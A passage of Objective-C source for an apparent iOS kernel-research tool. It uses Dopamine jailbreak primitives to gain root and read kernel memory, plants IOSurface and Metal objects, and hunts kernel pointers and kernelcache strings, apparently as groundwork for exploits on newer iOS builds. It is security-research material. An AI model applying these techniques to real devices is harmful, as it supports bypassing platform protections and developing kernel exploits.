#import "KReader.h"
#import "FKT_21D50.h"
#import "FKT_23F77.h"

#import <dlfcn.h>
#import <errno.h>
#import <mach/mach.h>
#import <spawn.h>
#import <stdio.h>
#import <stdlib.h>
#import <string.h>
#import <sys/sysctl.h>
#import <sys/wait.h>
#import <unistd.h>
#import <IOSurface/IOSurfaceRef.h>
#import <Metal/Metal.h>
#import <objc/message.h>
#import <objc/runtime.h>
#import <mach/mach_time.h>
#import <sys/mman.h>
#import <IOKit/IOKitLib.h>
#ifndef kIOMainPortDefault
#define kIOMainPortDefault kIOMasterPortDefault
#endif

extern char **environ;
extern int posix_spawnattr_set_persona_np(const posix_spawnattr_t * __restrict,
                                          uid_t, uint32_t);
extern int posix_spawnattr_set_persona_uid_np(const posix_spawnattr_t * __restrict, uid_t);
extern int posix_spawnattr_set_persona_gid_np(const posix_spawnattr_t * __restrict, uid_t);
#ifndef POSIX_SPAWN_PERSONA_FLAGS_OVERRIDE
#define POSIX_SPAWN_PERSONA_FLAGS_OVERRIDE 1
#endif

extern kern_return_t mach_vm_read_overwrite(vm_map_t target, mach_vm_address_t address,
                                            mach_vm_size_t size, mach_vm_address_t data,
                                            mach_vm_size_t *outsize);
extern kern_return_t mach_vm_region(vm_map_t target, mach_vm_address_t *address,
                                    mach_vm_size_t *size, vm_region_flavor_t flavor,
                                    vm_region_info_t info, mach_msg_type_number_t *count,
                                    mach_port_t *object_name);
extern kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address,
                                      mach_vm_size_t size, int flags);
extern kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address,
                                        mach_vm_size_t size);
extern kern_return_t mach_vm_remap(vm_map_t target, mach_vm_address_t *dst_address,
                                  mach_vm_size_t size, mach_vm_offset_t mask, int flags,
                                  vm_map_t src_task, mach_vm_address_t src_address,
                                  boolean_t copy, vm_prot_t *cur_protection,
                                  vm_prot_t *max_protection, vm_inherit_t inheritance);

typedef int (*krw_kread_t)(uint64_t from, void *to, size_t len);
typedef int (*krw_kwrite_t)(void *from, uint64_t to, size_t len);
typedef int (*krw_kbase_t)(uint64_t *base);
typedef int (*krw_physread_t)(uint64_t from, void *to, size_t len, uint8_t granule);

typedef uint64_t (*jb_task_self_t)(void);
typedef uint64_t (*jb_task_get_ipc_port_kobject_t)(uint64_t task, mach_port_t port);
typedef uint64_t (*jb_kread64_t)(uint64_t va);
typedef uint64_t (*jb_kread_ptr_t)(uint64_t va);
typedef uint32_t (*jb_kread32_t)(uint64_t va);

typedef struct fkt_krw_handlers {
    uint64_t version;
    int (*kbase)(uint64_t *addr);
    int (*kread)(uint64_t from, void *to, size_t len);
    int (*kwrite)(void *from, uint64_t to, size_t len);
    int (*kmalloc)(uint64_t *addr, size_t size);
    int (*kdealloc)(uint64_t addr, size_t size);
    int (*kcall)(uint64_t func, size_t argc, const uint64_t *argv, uint64_t *ret);
    int (*physread)(uint64_t from, void *to, size_t len, uint8_t granule);
    int (*physwrite)(void *from, uint64_t to, size_t len, uint8_t granule);
} fkt_krw_handlers_t;

typedef int (*fkt_krw_initializer_t)(fkt_krw_handlers_t *);

static NSString *FKTDumpPath(void) { return @"/var/mobile/Documents/lum1na-fkt-dump.txt"; }
static NSString *FKTSurfaceIdsPath(void) { return @"/var/mobile/Documents/lum1na-fkt-surfaces.txt"; }
static NSString *FKTHandoffPath(void) { return @"/var/mobile/Documents/lum1na-fkt-handoff.txt"; }
static NSString *FKTSnapAPath(void) { return @"/var/mobile/Documents/lum1na-fkt-snap-a.txt"; }
static NSString *FKTSnapBPath(void) { return @"/var/mobile/Documents/lum1na-fkt-snap-b.txt"; }

static NSMutableArray *gHeldSurfaces;
static NSMutableArray *gHeldPorts;
static NSMutableArray *gHeldMetal;

static uint64_t pac_strip(uint64_t p) { return p & 0x0000FFFFFFFFFFFFULL; }

static uint64_t unsign_kptr(uint64_t p) {
    if (!p) return 0;
    if (p & (1ULL << 55)) return p | 0xffffff8000000000ULL;
    return p & ~0xffffff8000000000ULL;
}

static BOOL is_kva(uint64_t p) {
    uint64_t s = unsign_kptr(p);
    return s >= 0xff80000000000000ULL;
}

static const char *va_class(uint64_t p) {
    if (!p) return "NULL";
    uint64_t s = unsign_kptr(p);
    if (s >= 0xff80000000000000ULL) return "KERN";
    if ((s >= 0x100000000ULL && s < 0x300000000ULL) ||
        (s >= 0x040000000ULL && s < 0x100000000ULL) ||
        (s >= 0x0e0000000ULL && s < 0x1000000000ULL))
        return "USER?";
    return "OTHER";
}

static BOOL is_ktextish(uint64_t p) {
    uint64_t s = unsign_kptr(p);
    return (s >= 0xfffffff000000000ULL && s < 0xfffffff100000000ULL);
}

static BOOL plausible_range_len(uint64_t s0) {
    return s0 > 0 && s0 < 0x400000ULL && !is_kva(s0);
}

static uint64_t fkt_canon_kva(uint64_t p) {
    uint64_t u = unsign_kptr(pac_strip(p));
    if ((u >> 44) == 0xfffULL) u |= 0xffff000000000000ULL;
    return u;
}

static uint64_t fkt_vt_unslid(uint64_t vt, uint64_t slide) {
    uint64_t u = fkt_canon_kva(vt);
    if (slide && u > slide) u -= slide;
    return u;
}

static BOOL is_kern_window(uint64_t a0, uint64_t s0) {
    uint64_t a = unsign_kptr(a0);
    if (a >= 0xffffffe400000000ULL && a < 0xfffffff000000000ULL) return YES;
    if (s0 >= 0x1000ULL) return YES;
    return NO;
}

static BOOL is_shape1_object(uint64_t a0, uint64_t s0, uint32_t flags, int taskKind) {
    if (taskKind == 1 && (flags & 0xffu) == 0x1bu) return NO;
    if (strcmp(va_class(a0), "KERN") != 0) return NO;
    if (is_ktextish(a0) || is_kern_window(a0, s0)) return NO;
    return s0 > 0 && s0 < 0x400ULL && !is_kva(s0);
}

static uint64_t fkt_pva_to_page(uint32_t packed) {
    if (packed == 0 || (int32_t)packed > 0) return 0;
    return ((uint64_t)(int64_t)(int32_t)packed) << 14;
}

static uintptr_t fkt_strip_uptr(uint64_t p) {
    if (!p) return 0;
    uintptr_t s40 = (uintptr_t)(p & 0xffffffffffULL);
    if (s40 >= 0x100000000ULL && s40 < 0x300000000ULL) return s40;
    return (uintptr_t)(p & 0xffffffffffffULL);
}

static id fkt_unwrapMetal(id obj);
static void *fkt_resourceRef(id obj);

static void fkt_appendMetalHandoff(NSMutableString *hand, void *rr, NSString *tag) {
    if (!rr || !hand) return;
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef uint32_t (*getType_t)(void *);
    getType_t getType = iogpu ? (getType_t)dlsym(iogpu, "IOGPUResourceGetResourceType") : NULL;
    uint32_t type = 0;
    memcpy(&type, (const char *)rr + 0x34, sizeof(type));
    if (getType) {
        uint32_t t2 = getType(rr);
        if (t2 != 0xffffffffu) type = t2;
    }
    uint32_t rid = 0, conn = 0;
    memcpy(&rid, (const char *)rr + 0x30, sizeof(rid));
    uint64_t inner_raw = 0;
    memcpy(&inner_raw, (const char *)rr + 0x10, sizeof(inner_raw));
    uintptr_t inner = fkt_strip_uptr(inner_raw);
    if (inner) memcpy(&conn, (const char *)(const void *)inner + 0x14, sizeof(conn));
    [hand appendFormat:@"metal 0x%llx %@ type=0x%x id=0x%x conn=0x%x\n",
          (unsigned long long)(uintptr_t)rr, tag, type, rid, conn];
}

@implementation KReader {
    mach_port_t _tfp0;
    uint64_t _kbase;
    uint64_t _slide;
    krw_kread_t _lib_kread;
    krw_kwrite_t _lib_kwrite;
    krw_kbase_t _lib_kbase;
    krw_physread_t _lib_physread;
    NSString *_backend;
    NSMutableString *_out;
    void *_jb;
    jb_task_self_t _jb_task_self;
    jb_task_get_ipc_port_kobject_t _jb_port_kobject;
    jb_kread64_t _jb_kread64;
    jb_kread_ptr_t _jb_kread_ptr;
    jb_kread32_t _jb_kread32;
    uint64_t (*_jb_proc_find)(pid_t);
    uint64_t (*_jb_proc_task)(uint64_t);
    int (*_jb_proc_vreadbuf)(uint64_t, const void *, void *, size_t);
    uint32_t _iosurface_md_off;
    uint64_t _ans_gmd_elemsz;
    uint64_t _ans_iosurface_md_slot;
    uint64_t _ans_sysmem_md_slot;
    int _ans_kalloc3072;
    int _ans_shape1_hits;
    uint64_t _gmd_zone_kva;
    uint64_t _gmd_zone_name_ptr;
    int _ans_mag_cap_live;
    uint64_t _gmd_vtable;
    uint16_t _gmd_elem_offs;
    uint16_t _gmd_chunk_elems;
    uint64_t _live_mds[32];
    int _n_live_mds;
    uint64_t _occ_seen_list[256];
    int _occ_seen_n;
    int _occ_user, _occ_kern, _occ_other, _occ_zero, _occ_kern_win;
    uint64_t _pages_walked[32];
    int _n_pages_walked;
    uint64_t _iosurface_kvas[16];
    int _n_iosurface_kvas;
    uint64_t _kernel_task;
    uint64_t _self_task;
    uint64_t _sysmems[16];
    int _n_sysmems;
}

+ (instancetype)shared {
    static KReader *g;
    static dispatch_once_t once;
    dispatch_once(&once, ^{ g = [KReader new]; });
    return g;
}

+ (NSString *)dumpPath { return FKTDumpPath(); }
+ (NSString *)leftoverCatalog { return FKTLeftoverCatalog(); }

+ (NSString *)scanLocalKernelcache {
    NSArray *cands = @[
        @"/var/mobile/Documents/kernelcache.release.iphone13.decompressed",
        @"/var/mobile/Documents/kernelcache.23F77.decompressed",
        @"/var/mobile/Documents/kernelcache.23G90.decompressed",
        @"/var/mobile/Documents/kernelcache.release.iPhone13,2_3",
    ];
    NSMutableString *out = [NSMutableString string];
    [out appendString:@"=== FKT KC FILE SCAN (userspace mmap — NOT live 26.5 kread) ===\n"];
    [out appendString:@"17.3 tfp0 still reads 21D50 RAM. This only parses a copied KC blob.\n"];
    NSString *path = nil;
    NSFileManager *fm = [NSFileManager defaultManager];
    for (NSString *c in cands) {
        [out appendFormat:@"  cand exists=%d %@\n", [fm fileExistsAtPath:c], c];
        if (!path && [fm fileExistsAtPath:c]) path = c;
    }
    if (!path) {
        [out appendString:@"STOP: scp 23F77 decompressed KC to /var/mobile/Documents/\n"];
        [out appendString:@"  artifacts/23F77/kernelcache.release.iphone13.decompressed\n"];
        return out;
    }
    NSDictionary *attrs = [fm attributesOfItemAtPath:path error:nil];
    unsigned long long sz = [attrs fileSize];
    [out appendFormat:@"using %@ bytes=%llu\n", path, sz];
    int fd = open(path.fileSystemRepresentation, O_RDONLY);
    if (fd < 0) { [out appendFormat:@"open failed errno=%d\n", errno]; return out; }
    void *map = mmap(NULL, (size_t)sz, PROT_READ, MAP_PRIVATE, fd, 0);
    close(fd);
    if (map == MAP_FAILED) { [out appendFormat:@"mmap failed errno=%d\n", errno]; return out; }
    
    const uint8_t *p = map;
    uint32_t magic = 0;
    memcpy(&magic, p, 4);
    [out appendFormat:@"magic=0x%x (MH_MAGIC_64=0xfeedfacf)\n", magic];
    if (magic == 0xfeedfacf || magic == 0xcffaedfe) {
        uint32_t ncmds = 0;
        memcpy(&ncmds, p + 16, 4);
        size_t off = 32;
        for (uint32_t i = 0; i < ncmds && off + 8 < sz; i++) {
            uint32_t cmd = 0, cmdsize = 0;
            memcpy(&cmd, p + off, 4);
            memcpy(&cmdsize, p + off + 4, 4);
            if (cmd == 0x19 && off + 72 <= sz) {
                char name[17] = {0};
                memcpy(name, p + off + 8, 16);
                uint64_t vmaddr = 0, fileoff = 0, filesize = 0;
                memcpy(&vmaddr, p + off + 24, 8);
                memcpy(&fileoff, p + off + 40, 8);
                memcpy(&filesize, p + off + 48, 8);
                if (strstr(name, "TEXT")) [out appendFormat:@"  seg %s vm=0x%llx fo=0x%llx sz=0x%llx\n", name, vmaddr, fileoff, filesize];
            }
            if (cmdsize < 8) break;
            off += cmdsize;
        }
    }
    struct { const char *name; const char *needle; } needles[] = {
        { "owns_replaceable_backing", "owns_replaceable_backing" },
        { "auto-prewiring", "max allowed in auto-prewiring" },
        { "CheckandPrewire", "ANE_ProgramCheckandPrewireBuffers_gated" },
        { "slide error", "shared region slide error" },
        { "i/o buffers", "Invalid number of i/o buffers" },
        { "file_check_mmap", "file_check_mmap increased max protections" },
        { "DataVault aned", "on-device compiled model DataVault" },
        { "cluster_write_contig", "cluster_write_contig" },
    };
    for (unsigned i = 0; i < sizeof(needles) / sizeof(needles[0]); i++) {
        const uint8_t *hit = memmem(p, (size_t)sz, needles[i].needle, strlen(needles[i].needle));
        if (!hit) { [out appendFormat:@"  MISS %s\n", needles[i].name]; continue; }
        size_t fo = (size_t)(hit - p);
        uint64_t va = 0;
        uint32_t ncmds2 = 0; memcpy(&ncmds2, p + 16, 4);
        size_t o2 = 32;
        for (uint32_t c = 0; c < ncmds2 && o2 + 72 < sz; c++) {
            uint32_t cmd = 0, cmdsize = 0;
            memcpy(&cmd, p + o2, 4); memcpy(&cmdsize, p + o2 + 4, 4);
            if (cmd == 0x19) {
                uint64_t vmaddr = 0, fileoff = 0, filesize = 0;
                memcpy(&vmaddr, p + o2 + 24, 8); memcpy(&fileoff, p + o2 + 40, 8); memcpy(&filesize, p + o2 + 48, 8);
                if (filesize && fo >= fileoff && fo < fileoff + filesize) { va = vmaddr + (fo - fileoff); break; }
            }
            if (cmdsize < 8) break;
            o2 += cmdsize;
        }
        [out appendFormat:@"  HIT %s fo=0x%zx unslid=0x%llx\n", needles[i].name, fo, va];
        if (strcmp(needles[i].name, "owns_replaceable_backing") == 0) [out appendString:@"    → 26.6+ F gate. Absent on 23F77 hunt KC.\n"];
        if (strcmp(needles[i].name, "auto-prewiring") == 0) [out appendString:@"    → 26.6+ fill cap. Absent on 23F77 = leftover 43748.\n"];
    }
    munmap(map, (size_t)sz);
    [out appendString:@"DONE. Compare HIT/MISS to leftover catalog. Not live kread.\n"];
    [out writeToFile:@"/var/mobile/Documents/lum1na-fkt-kcscan.txt" atomically:YES encoding:NSUTF8StringEncoding error:nil];
    return out;
}

+ (NSString *)snapAPath { return FKTSnapAPath(); }
+ (NSString *)snapBPath { return FKTSnapBPath(); }

+ (NSString *)copyDumpTo:(NSString *)dest label:(NSString *)label {
    NSString *src = FKTDumpPath();
    NSError *err = nil;
    NSString *body = [NSString stringWithContentsOfFile:src encoding:NSUTF8StringEncoding error:&err];
    if (!body.length) body = [KReader runDumpPreferringRoot];
    if (!body.length) return [NSString stringWithFormat:@"%@ FAIL: no dump\n%@", label, err.localizedDescription ?: @""];
    NSMutableString *keep = [NSMutableString string];
    [keep appendFormat:@"=== %@ %@ ===\n", label, [NSDate date]];
    for (NSString *line in [body componentsSeparatedByString:@"\n"]) {
        if ([line hasPrefix:@"PTR "] || [line hasPrefix:@"SYSMEM "] || [line hasPrefix:@"  SHAPE "] || [line hasPrefix:@"  OCC "] || [line hasPrefix:@"=== SYSMEM ATLAS"] || [line hasPrefix:@"=== POINTER HUNT"] || [line hasPrefix:@"Q3 IOGPUSysMemory"] || [line hasPrefix:@"  flags+0x30"] || [line hasPrefix:@"  +0x80="] || [line hasPrefix:@"  P010 twin"]) [keep appendFormat:@"%@\n", line];
    }
    [keep writeToFile:dest atomically:YES encoding:NSUTF8StringEncoding error:&err];
    if (err) return [NSString stringWithFormat:@"%@ write fail %@\n", label, err];
    return [NSString stringWithFormat:@"%@ wrote %lu lines → %@\n%@", label, (unsigned long)keep.length, dest, keep];
}

+ (NSString *)runSnapA { return [self copyDumpTo:FKTSnapAPath() label:@"SNAP-A"]; }
+ (NSString *)runSnapB { return [self copyDumpTo:FKTSnapBPath() label:@"SNAP-B"]; }

+ (NSSet<NSString *> *)huntKeysIn:(NSString *)body {
    NSMutableSet *s = [NSMutableSet set];
    for (NSString *line in [body componentsSeparatedByString:@"\n"]) {
        if ([line hasPrefix:@"PTR "]) {
            NSRange c = [line rangeOfString:@"cite="];
            NSRange l = [line rangeOfString:@" live="];
            if (c.location != NSNotFound && l.location != NSNotFound && l.location > c.location) {
                NSString *cite = [line substringWithRange:NSMakeRange(c.location, l.location - c.location)];
                NSRange live = [line rangeOfString:@"live="];
                NSRange cls = [line rangeOfString:@" class="];
                NSString *lv = (live.location != NSNotFound && cls.location != NSNotFound) ? [line substringWithRange:NSMakeRange(live.location, cls.location - live.location)] : @"";
                [s addObject:[NSString stringWithFormat:@"%@ %@", cite, lv]];
            } else { [s addObject:line]; }
        } else if ([line hasPrefix:@"  SHAPE "] || [line hasPrefix:@"  OCC "]) { [s addObject:line]; }
    }
    return s;
}

+ (NSString *)runDiff {
    NSString *a = [NSString stringWithContentsOfFile:FKTSnapAPath() encoding:NSUTF8StringEncoding error:nil];
    NSString *b = [NSString stringWithContentsOfFile:FKTSnapBPath() encoding:NSUTF8StringEncoding error:nil];
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"=== DIFF SNAP-A vs SNAP-B  %@ ===\n", [NSDate date]];
    [out appendString:@"only_in_B = appeared (new object / new kptr). only_in_A = gone.\n"];
    [out appendString:@"Twin FIELD# only. Do not paste 21D50 live VAs into P007.\n"];
    if (!a.length || !b.length) {
        [out appendFormat:@"need both snaps (A len=%lu B len=%lu). Dump Now, Snap A, change state, Dump Now, Snap B, Diff.\n", (unsigned long)a.length, (unsigned long)b.length];
        return out;
    }
    NSSet *sa = [self huntKeysIn:a];
    NSSet *sb = [self huntKeysIn:b];
    NSMutableArray *onlyA = [NSMutableArray array], *onlyB = [NSMutableArray array];
    for (NSString *k in sa) if (![sb containsObject:k]) [onlyA addObject:k];
    for (NSString *k in sb) if (![sa containsObject:k]) [onlyB addObject:k];
    [onlyA sortUsingSelector:@selector(compare:)]; [onlyB sortUsingSelector:@selector(compare:)];
    [out appendFormat:@"only_in_A %lu\n", (unsigned long)onlyA.count];
    for (NSString *k in onlyA) [out appendFormat:@"  - %@\n", k];
    [out appendFormat:@"only_in_B %lu\n", (unsigned long)onlyB.count];
    for (NSString *k in onlyB) [out appendFormat:@"  + %@\n", k];
    if (!onlyA.count && !onlyB.count) [out appendString:@"(no PTR/SHAPE/OCC delta)\n"];
    [out writeToFile:@"/var/mobile/Documents/lum1na-fkt-diff.txt" atomically:YES encoding:NSUTF8StringEncoding error:nil];
    return out;
}

+ (IOSurfaceRef)makeSurfaceW:(int)w h:(int)h {
    IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)@{
        @"IOSurfaceWidth" : @(w), @"IOSurfaceHeight" : @(h),
        @"IOSurfaceBytesPerElement" : @4, @"IOSurfacePixelFormat" : @((uint32_t)0x42475241),
    });
    if (!s) s = IOSurfaceCreate((__bridge CFDictionaryRef)@{ @"IOSurfaceAllocSize" : @(w * h * 4) });
    return s;
}

+ (NSUInteger)mintSurfacesForHelper {
    if (!gHeldSurfaces) gHeldSurfaces = [NSMutableArray new];
    if (!gHeldPorts) gHeldPorts = [NSMutableArray new];
    if (!gHeldMetal) gHeldMetal = [NSMutableArray new];
    [self releaseMintedSurfaces];
    NSMutableString *hand = [NSMutableString string];
    [hand appendFormat:@"pid %d\n", getpid()];
    int dims[][2] = { {120,120}, {64,64}, {256,256}, {32,32}, {128,64}, {96,96} };
    NSMutableArray<NSNumber *> *ids = [NSMutableArray array];
    for (unsigned i = 0; i < sizeof(dims) / sizeof(dims[0]); i++) {
        IOSurfaceRef s = [self makeSurfaceW:dims[i][0] h:dims[i][1]];
        if (!s) continue;
        uint32_t sid = IOSurfaceGetID(s);
        mach_port_t mp = IOSurfaceCreateMachPort(s);
        [gHeldSurfaces addObject:(__bridge_transfer id)s];
        if (MACH_PORT_VALID(mp)) { [gHeldPorts addObject:@(mp)]; [hand appendFormat:@"sport 0x%x %u\n", mp, sid]; }
        [ids addObject:@(sid)];
    }
    NSString *idBody = [ids componentsJoinedByString:@"\n"];
    [idBody writeToFile:FKTSurfaceIdsPath() atomically:YES encoding:NSUTF8StringEncoding error:nil];

    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    if (dev) {
        void *page = NULL;
        if (posix_memalign(&page, 0x4000, 0x4000) == 0 && page) {
            memset(page, 0x41, 0x4000);
            id<MTLBuffer> bnc = [dev newBufferWithBytesNoCopy:page length:0x4000 options:MTLResourceStorageModeShared deallocator:^(void *p, NSUInteger len) { free(p); }];
            if (bnc) {
                [gHeldMetal addObject:bnc];
                void *rr = fkt_resourceRef(fkt_unwrapMetal(bnc));
                fkt_appendMetalHandoff(hand, rr, @"bytesNoCopy");
            } else { free(page); [hand appendString:@"metal_bnc_fail\n"]; }
        }
        for (NSString *tag in @[ @"shared", @"private" ]) {
            MTLResourceOptions opt = [tag isEqualToString:@"shared"] ? MTLResourceStorageModeShared : MTLResourceStorageModePrivate;
            id<MTLBuffer> buf = [dev newBufferWithLength:0x4000 options:opt];
            if (!buf) continue;
            [gHeldMetal addObject:buf];
            void *rr = fkt_resourceRef(fkt_unwrapMetal(buf));
            fkt_appendMetalHandoff(hand, rr, tag);
        }
        id<MTLCommandQueue> cq = [dev newCommandQueue];
        if (cq) {
            [gHeldMetal addObject:cq];
            id rawq = fkt_unwrapMetal(cq);
            Ivar iv = class_getInstanceVariable(object_getClass(rawq), "_commandQueue");
            void *ioq = NULL;
            if (iv) ioq = *(void **)((uintptr_t)(__bridge void *)rawq + ivar_getOffset(iv));
            ioq = (void *)fkt_strip_uptr((uint64_t)(uintptr_t)ioq);
            void *iogpuQ = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
            if (!iogpuQ) iogpuQ = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
            typedef uint32_t (*qid_t)(void *); typedef uint32_t (*qconn_t)(void *);
            qid_t getQid = iogpuQ ? (qid_t)dlsym(iogpuQ, "IOGPUCommandQueueGetID") : NULL;
            qconn_t getQc = iogpuQ ? (qconn_t)dlsym(iogpuQ, "IOGPUCommandQueueGetConnect") : NULL;
            uint32_t qid = (ioq && getQid) ? getQid(ioq) : 0;
            uint32_t qconn = (ioq && getQc) ? getQc(ioq) : 0;
            [hand appendFormat:@"queue ioq=0x%llx id=%u conn=0x%x\n", (unsigned long long)(uintptr_t)ioq, qid, qconn];
        }
    } else { [hand appendString:@"metal_fail\n"]; }

    [hand writeToFile:FKTHandoffPath() atomically:YES encoding:NSUTF8StringEncoding error:nil];
    NSLog(@"[Lum1naFKT] handoff pid=%d surfaces=%lu ports=%lu metal=%lu → %@", getpid(), (unsigned long)ids.count, (unsigned long)gHeldPorts.count, (unsigned long)gHeldMetal.count, FKTHandoffPath());
    return ids.count;
}

+ (void)releaseMintedSurfaces {
    for (NSNumber *n in gHeldPorts) {
        mach_port_t mp = (mach_port_t)n.unsignedIntValue;
        if (MACH_PORT_VALID(mp)) mach_port_deallocate(mach_task_self(), mp);
    }
    [gHeldPorts removeAllObjects]; [gHeldSurfaces removeAllObjects]; [gHeldMetal removeAllObjects];
}

+ (NSArray<NSString *> *)helperCandidates {
    return @[@"/var/jb/usr/bin/lum1na-fkt-dump", @"/usr/bin/lum1na-fkt-dump", @"/var/jb/usr/local/bin/lum1na-fkt-dump"];
}

+ (int)spawnHelperAt:(NSString *)path asRoot:(BOOL)asRoot {
    const char *bin = path.fileSystemRepresentation;
    char *argv[] = { (char *)bin, NULL };
    posix_spawnattr_t attr; posix_spawnattr_init(&attr);
    if (asRoot) {
        posix_spawnattr_set_persona_np(&attr, 99, POSIX_SPAWN_PERSONA_FLAGS_OVERRIDE);
        posix_spawnattr_set_persona_uid_np(&attr, 0); posix_spawnattr_set_persona_gid_np(&attr, 0);
    }
    pid_t pid = 0; int err = posix_spawn(&pid, bin, NULL, &attr, argv, environ);
    posix_spawnattr_destroy(&attr);
    if (err != 0) { NSLog(@"[Lum1naFKT] posix_spawn(%@ root=%d) errno/err=%d", path, asRoot, err); return err; }
    int status = 0; if (waitpid(pid, &status, 0) < 0) return errno ? errno : -1;
    if (WIFEXITED(status)) return WEXITSTATUS(status);
    return -1;
}

+ (NSString *)runDumpPreferringRoot {
    if (getuid() == 0) return [[KReader shared] runPhase1];
    NSMutableString *diag = [NSMutableString string];
    [diag appendFormat:@"=== Lum1na-FKT 0.7.1 launcher  %@ ===\n", [NSDate date]];
    [diag appendFormat:@"launcher uid=%u euid=%u — spawning root helper\n", getuid(), geteuid()];
    [diag appendString:@"Dopamine: jbclient_initialize_primitives requires uid 0.\n"];
    NSUInteger nsurf = [self mintSurfacesForHelper];
    [diag appendFormat:@"minted %lu IOSurfaces for helper Lookup\n", (unsigned long)nsurf];
    NSFileManager *fm = [NSFileManager defaultManager]; BOOL ran = NO;
    for (NSString *cand in [self helperCandidates]) {
        if (![fm isExecutableFileAtPath:cand]) { [diag appendFormat:@"missing %@\n", cand]; continue; }
        int rv = [self spawnHelperAt:cand asRoot:YES];
        [diag appendFormat:@"spawn persona %@ → exit %d\n", cand, rv];
        if (rv != 0) { rv = [self spawnHelperAt:cand asRoot:NO]; [diag appendFormat:@"spawn plain %@ → exit %d\n", cand, rv]; }
        ran = YES;
        NSString *body = [NSString stringWithContentsOfFile:FKTDumpPath() encoding:NSUTF8StringEncoding error:nil];
        [self releaseMintedSurfaces];
        if (body.length) return body;
        [diag appendString:@"helper ran but dump empty / unreadable\n"]; break;
    }
    [self releaseMintedSurfaces];
    if (!ran) [diag appendString:@"FAIL: lum1na-fkt-dump helper not installed\n"];
    [diag appendString:@"falling back to in-process dump (expect KRW FAIL without uid 0)\n"];
    NSString *body = [[KReader shared] runPhase1];
    if (body.length) return [diag stringByAppendingString:body];
    return diag;
}

- (instancetype)init { self = [super init]; if (self) { _tfp0 = MACH_PORT_NULL; _backend = @"none"; _ans_kalloc3072 = -1; } return self; }

- (void)bindJailbreakHelpers:(void *)h {
    if (!h) return; _jb = h;
    _jb_task_self = (jb_task_self_t)dlsym(h, "task_self");
    _jb_port_kobject = (jb_task_get_ipc_port_kobject_t)dlsym(h, "task_get_ipc_port_kobject");
    _jb_kread64 = (jb_kread64_t)dlsym(h, "kread64");
    _jb_kread_ptr = (jb_kread_ptr_t)dlsym(h, "kread_ptr");
    _jb_kread32 = (jb_kread32_t)dlsym(h, "kread32");
    _jb_proc_find = dlsym(h, "proc_find"); _jb_proc_task = dlsym(h, "proc_task"); _jb_proc_vreadbuf = dlsym(h, "proc_vreadbuf");
    [self log:@"jb helpers task_self=%p port_kobj=%p kread_ptr=%p proc_find=%p vread=%p", _jb_task_self, _jb_port_kobject, _jb_kread_ptr, _jb_proc_find, _jb_proc_vreadbuf];
}

- (uint64_t)jkread_ptr:(uint64_t)addr { if (_jb_kread_ptr) return unsign_kptr(_jb_kread_ptr(addr)); return unsign_kptr([self kread64:addr]); }
- (uint64_t)jkread64:(uint64_t)addr { if (_jb_kread64) return _jb_kread64(addr); return [self kread64:addr]; }
- (uint32_t)jkread32:(uint64_t)addr { if (_jb_kread32) return _jb_kread32(addr); return [self kread32:addr]; }

- (NSString *)backendName { return _backend; }
- (uint64_t)kbase { return _kbase; }

- (void)log:(NSString *)fmt, ... NS_FORMAT_FUNCTION(1, 2) {
    va_list ap; va_start(ap, fmt); NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap]; va_end(ap);
    if (![line hasSuffix:@"\n"]) line = [line stringByAppendingString:@"\n"];
    [_out appendString:line];
    NSLog(@"[Lum1naFKT] %@", [line stringByTrimmingCharactersInSet:[NSCharacterSet newlineCharacterSet]]);
}

- (BOOL)ensureRoot {
    uid_t before = getuid(); [self log:@"uid before=%u euid=%u", before, geteuid()];
    if (before == 0) return YES;
    if (setuid(0) != 0) [self log:@"setuid(0) errno=%d", errno];
    if (seteuid(0) != 0) [self log:@"seteuid(0) errno=%d", errno];
    if (setgid(0) != 0) [self log:@"setgid(0) errno=%d", errno];
    uid_t after = getuid(); [self log:@"uid after=%u euid=%u", after, geteuid()];
    return after == 0;
}

- (int)callJbclientInitPrimitives {
    static const char *paths[] = { "/var/jb/usr/lib/libjailbreak.dylib", "/usr/lib/libjailbreak.dylib", NULL };
    for (int i = 0; paths[i]; i++) {
        void *h = dlopen(paths[i], RTLD_NOW); [self log:@"dlopen libjailbreak %s → %p", paths[i], h];
        if (!h) continue;
        typedef int (*init_t)(void); init_t init = (init_t)dlsym(h, "jbclient_initialize_primitives");
        if (!init) init = (init_t)dlsym(h, "jbdInitPPLRW");
        [self log:@"jbclient_initialize_primitives=%p", init];
        if (!init) continue;
        errno = 0; int rv = init(); [self log:@"jbclient_initialize_primitives rv=%d errno=%d", rv, errno];
        if (rv == 0) [self bindJailbreakHelpers:h];
        return rv;
    }
    [self log:@"libjailbreak not loadable"]; return -1;
}

- (BOOL)probeHandlersLabeled:(NSString *)label {
    if (!_lib_kread || !_lib_kbase) return NO;
    errno = 0; uint64_t base = 0; int br = _lib_kbase(&base);
    [self log:@"%@ kbase() rv=%d base=0x%llx errno=%d", label, br, base, errno];
    if (br != 0 || base < 0xfffff00000000000ULL) return NO;
    errno = 0; uint32_t magic = 0; int rr = _lib_kread(base, &magic, sizeof(magic));
    [self log:@"%@ kread(kbase) rv=%d magic=0x%08x errno=%d", label, rr, magic, errno];
    if (rr != 0) return NO;
    _kbase = base; return YES;
}

- (BOOL)tryDopaminePluginDirect {
    if (![self ensureRoot]) { [self log:@"STOP: not root — Dopamine KRW requires uid 0"]; return NO; }
    int jbrv = [self callJbclientInitPrimitives];
    if (jbrv != 0) { [self log:@"STOP: jbclient_initialize_primitives failed rv=%d", jbrv]; [self log:@"  Is Dopamine currently jailbroken? Try SB dump after respring."]; }
    static const char *plugins[] = { "/var/jb/usr/lib/libkrw/libkrw-dopamine.dylib", "/usr/lib/libkrw/libkrw-dopamine.dylib", NULL };
    for (int i = 0; plugins[i]; i++) {
        dlerror(); void *h = dlopen(plugins[i], RTLD_NOW); const char *err = dlerror();
        [self log:@"direct plugin %s → %p err=%s", plugins[i], h, h ? "(ok)" : (err ?: "?")];
        if (!h) continue;
